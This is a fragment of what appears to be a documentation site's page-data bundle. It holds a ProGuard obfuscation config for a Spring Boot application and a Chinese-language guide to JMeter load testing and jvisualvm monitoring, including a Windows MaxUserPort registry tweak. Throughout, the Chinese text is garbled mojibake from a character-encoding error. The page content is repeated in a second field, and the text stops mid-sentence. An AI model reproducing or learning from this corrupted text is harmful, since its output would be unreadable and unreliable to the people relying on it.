ç½®æ··æ·çä¸äºç»èéé¡¹ï¼æ¯å¦åªäºç±»ä¸éè¦æ··æ·ï¼åªäºéè¦æ··æ·--\x3e\n    <options>\n      \x3c!-- å¯ä»¥å¨æ­¤å¤åoptionæ ç­¾éç½®ï¼ä¸è¿æä¸é¢ä½¿ç¨äºproguardincludeï¼æèææ´åæ¬¢å¨proguard.cfgä¸­éç½® --\x3e\n    </options>\n  </configuration>\n</plugin>\n\x3c!-- spring,æ³¨æä¸å®è¦æ¾å¨æ··æ·æä»¶ä¹å --\x3e\n<plugin>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-maven-plugin</artifactid>\n  <configuration>\n    <excludes>\n      <exclude>\n        <groupid>org.projectlombok</groupid>\n        <artifactid>lombok</artifactid>\n      </exclude>\n    </excludes>\n  </configuration>\n  <executions>\n    <execution>\n      \x3c!-- spingboot æåéè¦repackageå¦åä¸æ¯å¯æ§è¡jar --\x3e\n      <goals>\n        <goal>repackage</goal>\n      </goals>\n      <configuration>\n        <mainclass>com.aizuda.easymanagertool.toolbootapplication</mainclass>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# éç½® proguard\n\n#æå®javaççæ¬\n-target 1.8\n#proguardä¼å¯¹ä»£ç è¿è¡ä¼ååç¼©ï¼ä»ä¼å é¤ä»æªä½¿ç¨çç±»æèç±»æååéç­\n-dontshrink\n#æ¯å¦å³é­å­èç çº§å«çä¼åï¼å¦æä¸å¼å¯åè®¾ç½®å¦ä¸éç½®\n-dontoptimize\n#æ··æ·æ¶ä¸çæå¤§å°åæ··åçç±»åï¼é»è®¤æ¯å¯ä»¥å¤§å°åæ··å\n-dontusemixedcaseclassnames\n# å¯¹äºç±»æåçå½åçæ··æ·éåå¯ä¸ç­ç¥\n-useuniqueclassmembernames\n#æ··æ·æ¶ä¸çæå¤§å°åæ··åçç±»åï¼é»è®¤æ¯å¯ä»¥å¤§å°åæ··å\n-dontusemixedcaseclassnames\n#æ··æ·ç±»åä¹åï¼å¯¹ä½¿ç¨class.forname('classname')ä¹ç±»çå°æ¹è¿è¡ç¸åºæ¿ä»£\n-adaptclassstrings\n\n#å¯¹å¼å¸¸ãæ³¨è§£ä¿¡æ¯äºä»¥ä¿ç\n-keepattributes exceptions,innerclasses,signature,deprecated,sourcefile,linenumbertable,*annotation*,enclosingmethod\n# æ­¤éé¡¹å°ä¿å­æ¥å£ä¸­çææåå§åç§°ï¼ä¸æ··æ·ï¼--\x3e\n#-keepnames interface ** { *; }\n# æ­¤éé¡¹å°ä¿å­ææè½¯ä»¶åä¸­çææåå§æ¥å£æä»¶ï¼ä¸è¿è¡æ··æ·ï¼\n#-keep interface * extends * { *; }\n#ä¿çåæ°åï¼å ä¸ºæ§å¶å¨ï¼æèmybatisç­æ¥å£çåæ°å¦ææ··æ·ä¼å¯¼è´æ æ³æ¥ååæ°ï¼xmlæä»¶æ¾ä¸å°åæ°\n-keepparameternames\n# ä¿çæä¸¾æååæ¹æ³\n-keepclassmembers enum * { *; }\n# ä¸æ··æ·ææç±»,ä¿å­åå§å®ä¹çæ³¨é-\n-keepclassmembers class * {\n    @org.springframework.context.annotation.bean *;\n    @org.springframework.beans.factory.annotation.autowired *;\n    @org.springframework.beans.factory.annotation.value *;\n    @org.springframework.stereotype.service *;\n    @org.springframework.stereotype.component *;\n}\n\n#å¿½ç¥warnæ¶æ¯\n-ignorewarnings\n#å¿½ç¥noteæ¶æ¯\n-dontnote\n#æå°éç½®ä¿¡æ¯\n-printconfiguration\n-keep public class com.aizuda.easymanagertool.toolbootapplication {\n        public static void main(java.lang.string[]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n",charsets:{cjk:!0}},{title:"JAVA æ§è½çæ§ï¼jvisualvmï¼åæµè¯ï¼JMeterï¼",frontmatter:{title:"JAVA æ§è½çæ§ï¼jvisualvmï¼åæµè¯ï¼JMeterï¼",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/3/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/3.JAVA%20%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7%EF%BC%88jvisualvm%EF%BC%89%E5%8F%8A%E6%B5%8B%E8%AF%95%EF%BC%88JMeter%EF%BC%89.html",relativePath:"00.è¯­è¨/01.JAVA/04.å¶ä»/3.JAVA æ§è½çæ§ï¼jvisualvmï¼åæµè¯ï¼JMeterï¼.md",key:"v-5ae2093a",path:"/language/java/other/3/",headers:[{level:2,title:"åºæ¬çè®º",slug:"åºæ¬çè®º",normalizedTitle:"åºæ¬çè®º",charIndex:2},{level:2,title:"JMeterä½¿ç¨",slug:"jmeterä½¿ç¨",normalizedTitle:"jmeter ä½¿ç¨",charIndex:865},{level:3,title:"JMeterä¸è½½",slug:"jmeterä¸è½½",normalizedTitle:"jmeter ä¸è½½",charIndex:879},{level:3,title:"è½¬æ¢ä¸­æ",slug:"è½¬æ¢ä¸­æ",normalizedTitle:"è½¬æ¢ä¸­æ",charIndex:925},{level:3,title:"åå»ºçº¿ç¨ç»",slug:"åå»ºçº¿ç¨ç»",normalizedTitle:"åå»ºçº¿ç¨ç»",charIndex:936},{level:3,title:"æ·»å httpè¯·æ±",slug:"æ·»å httpè¯·æ±",normalizedTitle:"æ·»å  http è¯·æ±",charIndex:1013},{level:3,title:"æ·»å ç»ææ ",slug:"æ·»å ç»ææ ",normalizedTitle:"æ·»å ç»ææ ",charIndex:1036},{level:3,title:"æ·»å æ±æ»æ¥å",slug:"æ·»å æ±æ»æ¥å",normalizedTitle:"æ·»å æ±æ»æ¥å",charIndex:1065},{level:3,title:"èåæ¥å",slug:"èåæ¥å",normalizedTitle:"èåæ¥å",charIndex:1080},{level:3,title:"æ±æ»å¾",slug:"æ±æ»å¾",normalizedTitle:"æ±æ»å¾",charIndex:1093},{level:3,title:"Jmeter Address Already in use",slug:"jmeter-address-already-in-use",normalizedTitle:"jmeter address already in use",charIndex:1105},{level:2,title:"jvisualvm",slug:"jvisualvm",normalizedTitle:"jvisualvm",charIndex:1532},{level:3,title:"å¯å¨jvisualvm",slug:"å¯å¨jvisualvm",normalizedTitle:"å¯å¨ jvisualvm",charIndex:1546},{level:3,title:"çº¿ç¨",slug:"çº¿ç¨",normalizedTitle:"çº¿ç¨",charIndex:938},{level:3,title:"å®è£æä»¶",slug:"å®è£æä»¶",normalizedTitle:"å®è£æä»¶",charIndex:1945},{level:3,title:"Histogram ç´æ¹å¾",slug:"histogram-ç´æ¹å¾",normalizedTitle:"histogram ç´æ¹å¾",charIndex:2340}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"åºæ¬çè®º JMeterä½¿ç¨ JMeterä¸è½½ è½¬æ¢ä¸­æ åå»ºçº¿ç¨ç» æ·»å httpè¯·æ± æ·»å ç»ææ  æ·»å æ±æ»æ¥å èåæ¥å æ±æ»å¾ Jmeter Address Already in use jvisualvm å¯å¨jvisualvm çº¿ç¨ å®è£æä»¶ Histogram ç´æ¹å¾",content:'# åºæ¬çè®º\n\né¤äºæ¬èº«è¦ææ¡ JAVA API çåºæ¬ä½¿ç¨å¤ï¼æä»¬è¿éè¦å¯¹ JAVA çæåé¡¹ç®ä»¥åæµè¯æ¹æ³è¦ææäºè§£ï¼é¦åæä»¬å¾çè§£ä»ä¹æ¯ååºæ¶é´ï¼è¯·æ±æ¶é´ï¼HPSï¼TPS ä»¥å QPS ç­ã\n\n * ååºæ¶é´æ¯æç¨æ·ä»å®¢æ·ç«¯åèµ·ä¸ä¸ªè¯·æ±å¼å§ï¼å°å®¢æ·ç«¯æ¥æ¶å°ä»æå¡å¨ç«¯è¿åçååºç»æï¼æ´ä¸ªè¿ç¨æèè´¹çæ¶é´ã\n * è¯·æ±æ¶é´æ¯å®¢æ·ç«¯åéè¯·æ±å°æå¡ç«¯æ¥æ¶å°è¯·æ±çæ¶é´ã\n * HPS (Hits Per Second) æ¯ç§ç¹å»æ¬¡æ°ï¼åä½æ¯ æ¬¡ / ç§\n * TPS (Hits Per Second) ç³»ç»æ¯ç§å¤çäº¤ææ° (äºå¡æ°ï¼æ¥å£é»è¾æ°)ï¼åä½æ¯ç¬ / ç§\n * QPS (Query Per Second) ç³»ç»æ¯ç§å¤çæ¥è¯¢æ¬¡æ°ï¼åä½æ¯ æ¬¡ / ç§ã\n * æå¤§ãæå°ååºæ¶é´\n   æç¨æ·ååºè¯·æ±æèæä»¤å°ç³»ç»ååºååº (ååº) çæå¤§ãæå°æ¶é´ã\n * 90% ååºæ¶é´\n   æ 100 ä¸ªäººï¼æ 90 ä¸ªäºº 1s åå¾å°ç³»ç»çåé¦ï¼å°±ä»£è¡¨ä¼åå°ä¸å®çç¨åº¦ï¼è¿æ 10% ç¸å¯¹ä¼åå¤æåº¦å°±å¾é«äºã\n\nå¯¹äºäºèç½ä¸å¡ä¸­ï¼å¦ææäºä¸å¡æä¸ä»æä¸ä¸ªè¯·æ±é¾æ¥ï¼é£ä¹ TPS=QPS=HPSï¼ä¸çæåµä¸ç¨ TPS æ¥è¡¡éæ´ä¸ªä¸å¡æµç¨ï¼ç¨ QPS æ¥è¡¡éæ¥å£æ¥è¯¢æ¬¡æ°ï¼ç¨ HPS æ¥è¡¨ç¤ºå¯¹æå¡å¨åå»è¯·æ±ã æ è®º TPSï¼QPSï¼HPSï¼è¿äºææ é½æ¯è¡¡éç³»ç»å¤çè½åéå¸¸éè¦çææ ï¼è¶å¤§è¶å¥½ï¼æ ¹æ®ç»éªï¼ä¸è¬æåµä¸ï¼\n\n 1. éèè¡ä¸ 1K TPS~50K TPS\n 2. ä¿é©è¡ä¸ 100 TPS~10W TPS\n 3. å¶é è¡ä¸ 10 TPS~5K TPS\n 4. äºèç½çµå­åå¡ 1W TPS~100W TPS\n 5. äºèç½ä¸­åç½ç« 1K TPS~5W TPS\n 6. äºèç½å°åç½ç« 500 TPS~1W TPS\n\nå¯¹äºç³»ç»æ¥è¯´æä¸ä¸ªéè¦çææ æ¯æä»¬ä¸å®è¦çç\n\n * ååéï¼æ¯ç§ç³»ç»è½å¤å¤ççè¯·æ±æ°ï¼ä»»å¡æ°\n * ååºæ¶é´ï¼æå¡å¤çä¸ä¸ªè¯·æ±æä¸ä¸ªä»»å¡çèæ¶\n * éè¯¯çï¼ä¸æ¹è¯·æ±ä¸­ç»æåºéçè¯·æ±æå æ¯ä¾\n\n\n# JMeter ä½¿ç¨\n\n\n# JMeter ä¸è½½\n\nå°å\n\n> ä»¥ä¸ææçè¯·æ±æ¶é´é½ä¸º msï¼é¤éæ ææ¶é´åä½ã\n\n\n# è½¬æ¢ä¸­æ\n\n\n\n\n# åå»ºçº¿ç¨ç»\n\n\n\n\n\nçº¿ç¨æ°ï¼æ¨¡æå¹¶åç¨æ·æ°é\nRamp-Up æ¶é´ï¼ç§ï¼ï¼å¨è®¾ç½®çæ¶é´ç»æä¹åï¼å¯å¨ææçº¿ç¨æ°\nå¾ªç¯æ¬¡æ°ï¼åä¸ªçº¿ç¨æ§è¡å æ¬¡\n\n\n\n\n# æ·»å  http è¯·æ±\n\n\n\n\n\n\n\n\n\n\n# æ·»å ç»ææ \n\n\n\n\n\nä¼æææè¯·æ±çä¿¡æ¯ååºæ¥ã\n\n\n# æ·»å æ±æ»æ¥å\n\n\n\n\n\n\n# èåæ¥å\n\n\n\n\n\n\n# æ±æ»å¾\n\n\n\n\n\n\n# Jmeter Address Already in use\n\nwindows æ¬èº«æä¾çç«¯å£æºå¶é®é¢ã\nwindows æä¾ç»æä»¬ TCP/IP çç«¯å£ä¸º 1024-5000ï¼å¹¶ä¸è¦ 4 åéæ¥å¾ªç¯åæ¶ä»ä»¬ï¼å°±å¯¼è´æä»¬å¨ç­æ¶é´åè·å¤§éçè¯·æ±æ¶å°ç«¯å£æ²¾æ»¡ã\nè§£å³æ¹å¼ï¼\n\n 1. cmd ä¸­è¾å¥ regedit å½ä»¤æå¼æ³¨åè¡¨\n 2. å¨ HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters ï¼å³å» Parameters ï¼æ·»å ä¸ä¸ªæ°ç DWORDï¼åå­ä¸º MaxUserPortï¼åå» MaxUserPort ï¼è¾å¥æ°å¼æ°æ®ä¸º 65534ï¼åºæ°éæ©åè¿å¶ (å¦ææ¯åå¸å¼è¿è¡çè¯ï¼æ§å¶æºå¨åè´è½½æºå¶é½éè¦è¿æ ·æä½)ï¼ä¿®æ¹å®æ¯åéå¯çµèæè½çæãç¸åçä½ç½®è¿å¯ä»¥æ·»å  TCPTimedWaitDelay å¼ä¸º 30ï¼å MaxUserPort æ·»å æ¹å¼ä¸æ ·ã\n\n\n# jvisualvm\n\n\n# å¯å¨ jvisualvm\n\njvisualvm å¨ jdk åä¸­å·²ç»æäºï¼åªéè¦æå¼ cmd è¾å¥ jvisualvm å°±è½å¯å¨\n\n> å¨é«çæ¬ JDKï¼å¤§äº 1.8 æåææ´æ°ç 1.8 çæ¬ï¼ä¸­å·²ç»ä¸ä¼åèªå¨éæ VisualVMï¼https://visualvm.github.io/index.html å°è¿éè¿è¡ä¸è½½\n\nä¸è½½ç visualvm é»è®¤ä¼æ¾ç¯å¢ä¸­ç jdk1.8ï¼ä½å¦æä½ ä¸æ¯ jdk1.8 åå¯ä»¥ä¿®æ¹éç½®ï¼visualvm_218/etc/visualvm.confï¼ï¼ä¿®æ¹åå®¹å¦ä¸ï¼\n\n# è®¾ç½®æèªå·±å®è£çjavaè·¯å¾\nvisualvm_jdkhome="D:\\tool\\java\\java17"\n\n\n1\n2\n\n\n\n# çº¿ç¨\n\n\n\nè¿è¡ï¼æ­£å¸¸è¿è¡\nä¼ç ï¼sleep ä¸­ççº¿ç¨\nç­å¾ï¼wait ä¸­ççº¿ç¨\né©»çï¼çº¿ç¨æ± éå¾ç©ºé²çº¿ç¨\nçè§ï¼æ­£å¨é»å¡ççº¿ç¨ï¼ç­å¾éçã\n\n\n# å®è£æä»¶\n\nå®è£æä»¶ååæ£æ¥æ´æ°ï¼å¦æåºéäºéè¦æ´æ°å°åï¼å å·¥å· - æä»¶ - æ´æ° - æ£æ¥æ´æ° æ¥æ£æµæ¯å¦æéï¼å¦ææéï¼åæ¥ç jdk çæ¬ï¼ç¶åå» https://visualvm.github.io/pluginscenters.htmlï¼æ¾å°ç¸åçæ¬ç gz urlï¼åå° æä»¶ - è®¾ç½® - ç¼è¾ï¼æ´æ° url å³å¯ã\n\n\n\nvisual GC éè¿å®å¯ä»¥çå°æ´ä¸ªåå¾åæ¶çè¿ç¨ãå®è£å®æåï¼éåºéè¿ã\n\n\n\nGC timeï¼14 collectionsï¼798.209ms Last Cause ï¼System.gc () = åçäº 14 æ¬¡ GCï¼è±äº 798.209msã\nEden Space (666.000Mï¼292.500M)ï¼148.296Mï¼11 collectionsï¼223.272ms = åçäº 11 æ¬¡ GCï¼è±äº 223.272ms\n\n\n# Histogram ç´æ¹å¾\n\n\n\nç´æ¹å¾åªå¨ä½¿ç¨ G1 åå¾åæ¶å¨æä¼åºç°\n\n * Tenuring Threshold=15ï¼è¿è¡¨ç¤ºå¯¹è±¡å¨æåå°èå¹´ä»£ä¹åéè¦å¨å¹´è½»ä»£ä¸­ç»åçæå°åå¾æ¶éæ¬¡æ°ãå¦æä¸ä¸ªå¯¹è±¡å¨å¹´è½»ä»£ä¸­çå­è¶è¿ 15 æ¬¡åå¾æ¶éå¾ªç¯ï¼é£ä¹å®å°è¢«è½¬ç§»å°èå¹´ä»£ã\n * Max Tenuring Threshold=15ï¼è¿æ¯ tenuring éå¼åè®¸çæå¤§å¼ãå¨ä½ çä¾å­ä¸­ï¼Tenuring Threshold å Max Tenuring Threshold é½è®¾ç½®ä¸º 15ï¼è¿æå³çè¿æ¯ JVM åè®¸çæé¿æ¶é´ï¼å¯¹è±¡å¨å¹´è½»ä»£ä¸­å¯ä»¥éçèä¸è¢«æåå°èå¹´ä»£ãè¿éå¶äºå¹´è½»ä»£å¯¹è±¡çå¹´é¾ä¸éï¼ç®åäºæåå³ç­ã\n * Desired Survivor size=268435456ï¼è¿æ¯ G1 åå¾æ¶éå¨ææçæ¯ä¸ª Survivor ç©ºé´ççæ³å¤§å°ãçæ³æåµä¸ï¼Survivor ç©ºé´çå®¹éä¼è¢«è®¾ä¸ºè¿ä¸ªå¼ï¼ä»¥å®¹çº³ä» Eden åºæå¦ä¸ä¸ª Survivor åºå­æ´»ä¸æ¥çå¯¹è±¡ãè¿ä¸ªè®¾ç½®æå©äºä¼åå¹´è½»ä»£çåå­åéååæ¶æçã\n * Current survivor size=8ï¼è¿è¡¨ç¤ºå½åæä¸ª Survivor ç©ºé´çå®éå¤§å°ï¼åä½æ¯å­èãç»åºçä¾å­ä¸­ï¼æ¾ç¤ºç 8 å­èçèµ·æ¥å¼å¸¸å°ï¼å ä¹è¯å®æ¯ä¸ä¸ªæ¾ç¤ºéè¯¯æèè¯¯è§£ï¼å ä¸ºè¿æ ·çå¤§å°è¿è¿ä¸è¶³ä»¥æ»¡è¶³æ­£å¸¸çå¯¹è±¡å­å¨éæ±ãæ­£å¸¸æåµä¸ï¼è¿ä¸ªå¼åºè¯¥æ¥è¿æç­äº Desired Survivor Sizeãå¯è½æ¯ç±äºå¨ VisualVM æè·é£ä¸å»ç¶ææ¶ï¼Survivor ç©ºé´æ­£å¨è¿è¡è°æ´ï¼æèå­å¨æç§æ¥åä¸çåå·®ï¼éè¦è¿ä¸æ­¥æ£æ¥åç¡®è®¤ã\n\nä» 0 å° 15ãæ¯ä¸æ ¼çé¢è²ä»£è¡¨äºå¤äºè¯¥å¹´é¾çº§å«çå¯¹è±¡æ°éãä¾å¦ï¼ç¬¬ä¸åï¼å¹´é¾çº§å« 0ï¼æä¸ä¸ªæ©è²çæ ¼å­ï¼è¡¨ç¤ºæä¸äºå¯¹è±¡ååè¿å¥å¹´è½»ä»£ï¼å®ä»¬çå¹´é¾ä¸º 0ãç¬¬äºåï¼å¹´é¾çº§å« 1ï¼æä¸¤ä¸ªæ©è²æ ¼å­ï¼è¯´ææä¸¤ç»å¯¹è±¡å·²ç»ç»åäºç¬¬ä¸æ¬¡åå¾æ¶éï¼ç°å¨å®ä»¬çå¹´é¾ä¸º 1ã\n\nè¯·æ³¨æï¼è¿ä¸ªç´æ¹å¾å¹¶ä¸åæ å®éçæ°éï¼èæ¯éè¿é¢è²åæ¥è¡¨ç¤ºç¸å¯¹æ°éãå æ­¤ï¼ä¸¤ä¸ªæ©è²æ ¼å­å¹¶ä¸ä¸å®è¡¨ç¤ºç¡®åçä¸¤ä¸ªå¯¹è±¡ï¼èåªæ¯è¡¨ææå¤ä¸ªå¯¹è±¡å¤äºè¿ä¸ªå¹´é¾çº§å«ã',normalizedContent:'# åºæ¬çè®º\n\né¤äºæ¬èº«è¦ææ¡ java api çåºæ¬ä½¿ç¨å¤ï¼æä»¬è¿éè¦å¯¹ java çæåé¡¹ç®ä»¥åæµè¯æ¹æ³è¦ææäºè§£ï¼é¦åæä»¬å¾çè§£ä»ä¹æ¯ååºæ¶é´ï¼è¯·æ±æ¶é´ï¼hpsï¼tps ä»¥å qps ç­ã\n\n * ååºæ¶é´æ¯æç¨æ·ä»å®¢æ·ç«¯åèµ·ä¸ä¸ªè¯·æ±å¼å§ï¼å°å®¢æ·ç«¯æ¥æ¶å°ä»æå¡å¨ç«¯è¿åçååºç»æï¼æ´ä¸ªè¿ç¨æèè´¹çæ¶é´ã\n * è¯·æ±æ¶é´æ¯å®¢æ·ç«¯åéè¯·æ±å°æå¡ç«¯æ¥æ¶å°è¯·æ±çæ¶é´ã\n * hps (hits per second) æ¯ç§ç¹å»æ¬¡æ°ï¼åä½æ¯ æ¬¡ / ç§\n * tps (hits per second) ç³»ç»æ¯ç§å¤çäº¤ææ° (äºå¡æ°ï¼æ¥å£é»è¾æ°)ï¼åä½æ¯ç¬ / ç§\n * qps (query per second) ç³»ç»æ¯ç§å¤çæ¥è¯¢æ¬¡æ°ï¼åä½æ¯ æ¬¡ / ç§ã\n * æå¤§ãæå°ååºæ¶é´\n   æç¨æ·ååºè¯·æ±æèæä»¤å°ç³»ç»ååºååº (ååº) çæå¤§ãæå°æ¶é´ã\n * 90% ååºæ¶é´\n   æ 100 ä¸ªäººï¼æ 90 ä¸ªäºº 1s åå¾å°ç³»ç»çåé¦ï¼å°±ä»£è¡¨ä¼åå°ä¸å®çç¨åº¦ï¼è¿æ 10% ç¸å¯¹ä¼åå¤æåº¦å°±å¾é«äºã\n\nå¯¹äºäºèç½ä¸å¡ä¸­ï¼å¦ææäºä¸å¡æä¸ä»æä¸ä¸ªè¯·æ±é¾æ¥ï¼é£ä¹ tps=qps=hpsï¼ä¸çæåµä¸ç¨ tps æ¥è¡¡éæ´ä¸ªä¸å¡æµç¨ï¼ç¨ qps æ¥è¡¡éæ¥å£æ¥è¯¢æ¬¡æ°ï¼ç¨ hps æ¥è¡¨ç¤ºå¯¹æå¡å¨åå»è¯·æ±ã æ è®º tpsï¼qpsï¼hpsï¼è¿äºææ é½æ¯è¡¡éç³»ç»å¤çè½åéå¸¸éè¦çææ ï¼è¶å¤§è¶å¥½ï¼æ ¹æ®ç»éªï¼ä¸è¬æåµä¸ï¼\n\n 1. éèè¡ä¸ 1k tps~50k tps\n 2. ä¿é©è¡ä¸ 100 tps~10w tps\n 3. å¶é è¡ä¸ 10 tps~5k tps\n 4. äºèç½çµå­åå¡ 1w tps~100w tps\n 5. äºèç½ä¸­åç½ç« 1k tps~5w tps\n 6. äºèç½å°åç½ç« 500 tps~1w tps\n\nå¯¹äºç³»ç»æ¥è¯´æä¸ä¸ªéè¦çææ æ¯æä»¬ä¸å®è¦çç\n\n * ååéï¼æ¯ç§ç³»ç»è½å¤å¤ççè¯·æ±æ°ï¼ä»»å¡æ°\n * ååºæ¶é´ï¼æå¡å¤çä¸ä¸ªè¯·æ±æä¸ä¸ªä»»å¡çèæ¶\n * éè¯¯çï¼ä¸æ¹è¯·æ±ä¸­ç»æåºéçè¯·æ±æå æ¯ä¾\n\n\n# jmeter ä½¿ç¨\n\n\n# jmeter ä¸è½½\n\nå°å\n\n> ä»¥ä¸ææçè¯·æ±æ¶é´é½ä¸º msï¼é¤éæ ææ¶é´åä½ã\n\n\n# è½¬æ¢ä¸­æ\n\n\n\n\n# åå»ºçº¿ç¨ç»\n\n\n\n\n\nçº¿ç¨æ°ï¼æ¨¡æå¹¶åç¨æ·æ°é\nramp-up æ¶é´ï¼ç§ï¼ï¼å¨è®¾ç½®çæ¶é´ç»æä¹åï¼å¯å¨ææçº¿ç¨æ°\nå¾ªç¯æ¬¡æ°ï¼åä¸ªçº¿ç¨æ§è¡å æ¬¡\n\n\n\n\n# æ·»å  http è¯·æ±\n\n\n\n\n\n\n\n\n\n\n# æ·»å ç»ææ \n\n\n\n\n\nä¼æææè¯·æ±çä¿¡æ¯ååºæ¥ã\n\n\n# æ·»å æ±æ»æ¥å\n\n\n\n\n\n\n# èåæ¥å\n\n\n\n\n\n\n# æ±æ»å¾\n\n\n\n\n\n\n# jmeter address already in use\n\nwindows æ¬èº«æä¾çç«¯å£æºå¶é®é¢ã\nwindows æä¾ç»æä»¬ tcp/ip çç«¯å£ä¸º 1024-5000ï¼å¹¶ä¸è¦ 4 åéæ¥å¾ªç¯åæ¶ä»ä»¬ï¼å°±å¯¼è´æä»¬å¨ç­æ¶é´åè·å¤§éçè¯·æ±æ¶å°ç«¯å£æ²¾æ»¡ã\nè§£å³æ¹å¼ï¼\n\n 1. cmd ä¸­è¾å¥ regedit å½ä»¤æå¼æ³¨åè¡¨\n 2. å¨ hkey_local_machine\\system\\currentcontrolset\\services\\tcpip\\parameters ï¼å³å» parameters ï¼æ·»å ä¸ä¸ªæ°ç dwordï¼åå­ä¸º maxuserportï¼åå» maxuserport ï¼è¾å¥æ°å¼æ°æ®ä¸º 65534ï¼åºæ°éæ©åè¿å¶ (å¦ææ¯åå¸å¼è¿è¡çè¯ï¼æ§å¶æºå¨åè´è½½æºå¶é½éè¦è¿æ ·æä½)ï¼ä¿®æ¹å®æ¯åéå¯çµèæè½çæãç¸åçä½ç½®è¿å¯ä»¥æ·»å  tcptimedwaitdelay å¼ä¸º 30ï¼å maxuserport æ·»å æ¹å¼ä¸æ ·ã\n\n\n# jvisualvm\n\n\n# å¯å¨ jvisualvm\n\njvisualvm å¨ jdk åä¸­å·²ç»æäºï¼åªéè¦æå¼ cmd è¾å¥ jvisualvm å°±è½å¯å¨\n\n> å¨é«çæ¬ jdkï¼å¤§äº 1.8 æåææ´æ°ç 1.8 çæ¬ï¼ä¸­å·²ç»ä¸ä¼åèªå¨éæ visualvmï¼https://visualvm.github.io/index.html å°è¿éè¿è¡ä¸è½½\n\nä¸è½½ç visualvm é»è®¤ä¼æ¾ç¯å¢ä¸­ç jdk1.8ï¼ä½å¦æä½ ä¸æ¯ jdk1.8 åå¯ä»¥ä¿®æ¹éç½®ï¼visualvm_218/etc/visualvm.confï¼ï¼ä¿®æ¹åå®¹å¦ä¸ï¼\n\n# è®¾ç½®æèªå·±å®è£çjavaè·¯å¾\nvisualvm_jdkhome="d:\\tool\\java\\java17"\n\n\n1\n2\n\n\n\n# çº¿ç¨\n\n\n\nè¿è¡ï¼æ­£å¸¸è¿è¡\nä¼ç ï¼sleep ä¸­ççº¿ç¨\nç­å¾ï¼wait ä¸­ççº¿ç¨\né©»çï¼çº¿ç¨æ± éå¾ç©ºé²çº¿ç¨\nçè§ï¼æ­£å¨é»å¡ççº¿ç¨ï¼ç­å¾éçã\n\n\n# å®è£æä»¶\n\nå®è£æä»¶ååæ£æ¥æ´æ°ï¼å¦æåºéäºéè¦æ´æ°å°åï¼å å·¥å· - æä»¶ - æ´æ° - æ£æ¥æ´æ° æ¥æ£æµæ¯å¦æéï¼å¦ææéï¼åæ¥ç jdk çæ¬ï¼ç¶åå» https://visualvm.github.io/pluginscenters.htmlï¼æ¾å°ç¸åçæ¬ç gz urlï¼åå° æä»¶ - è®¾ç½® - ç¼è¾ï¼æ´æ° url å³å¯ã\n\n\n\nvisual gc éè¿å®å¯ä»¥çå°æ´ä¸ªåå¾åæ¶çè¿ç¨ãå®è£å®æåï¼éåºéè¿ã\n\n\n\ngc timeï¼14 collectionsï¼798.209ms last cause ï¼system.gc () = åçäº 14 æ¬¡ gcï¼è±äº 798.209msã\neden space (666.000mï¼292.500m)ï¼148.296mï¼11 collectionsï¼223.272ms = åçäº 11 æ¬¡ gcï¼è±äº 223.272ms\n\n\n# histogram ç´æ¹å¾\n\n\n\nç´æ¹å¾åªå¨ä½¿ç¨ g1 åå¾åæ¶å¨æä¼åºç°\n\n * tenuring threshold=15ï¼è¿è¡¨ç¤ºå¯¹è±¡å¨æåå°èå¹´ä»£ä¹åéè¦å¨å¹´è½»ä»£ä¸­ç»åçæå°åå¾æ¶éæ¬¡æ°ãå¦æä¸ä¸ªå¯¹è±¡å¨å¹´è½»ä»£ä¸­çå­è¶è¿ 15 æ¬¡åå¾æ¶éå¾ªç¯ï¼é£ä¹å®å°è¢«è½¬ç§»å°èå¹´ä»£ã\n * max tenuring threshold=15ï¼è¿æ¯ tenuring éå¼åè®¸çæå¤§å¼ãå¨ä½ çä¾å­ä¸­ï¼tenuring threshold å max tenuring threshold é½è®¾ç½®ä¸º 15ï¼è¿æå³çè¿æ¯ jvm åè®¸çæé¿æ¶é´ï¼å¯¹è±¡å¨å¹´è½»ä»£ä¸­å¯ä»¥éçèä¸è¢«æåå°èå¹´ä»£ãè¿éå¶äºå¹´è½»ä»£å¯¹è±¡çå¹´é¾ä¸éï¼ç®åäºæåå³ç­ã\n * desired survivor size=268435456ï¼è¿æ¯ g1 åå¾æ¶éå¨ææçæ¯ä¸ª survivor ç©ºé´ççæ³å¤§å°ãçæ³æåµä¸ï¼survivor ç©ºé´çå®¹éä¼è¢«è®¾ä¸ºè¿ä¸ªå¼ï¼ä»¥å®¹çº³ä» eden åºæå¦ä¸ä¸ª survivor åºå­æ´»ä¸æ¥çå¯¹è±¡ãè¿ä¸ªè®¾ç½®æå©äºä¼åå¹´è½»ä»£çåå­åéååæ¶æçã\n * current survivor size=8ï¼è¿è¡¨ç¤ºå½åæä¸ª survivor ç©ºé´çå®éå¤§å°ï¼åä½æ¯å­èãç»åºçä¾å­ä¸­ï¼æ¾ç¤ºç 8 å­èçèµ·æ¥å¼å¸¸å°ï¼å ä¹è¯å®æ¯ä¸ä¸ªæ¾ç¤ºéè¯¯æèè¯¯è§£ï¼å ä¸ºè¿æ ·çå¤§å°è¿è¿ä¸è¶³ä»¥æ»¡è¶³æ­£å¸¸çå¯¹è±¡å­å¨éæ±ãæ­£å¸¸æåµä¸ï¼è¿ä¸ªå¼åºè¯¥æ¥è¿æç­äº desired survivor sizeãå¯è½æ¯ç±äºå¨ visualvm æè·é£ä¸å»ç¶ææ¶ï¼survivor ç©ºé´æ­£å¨è¿è¡è°æ´ï¼æè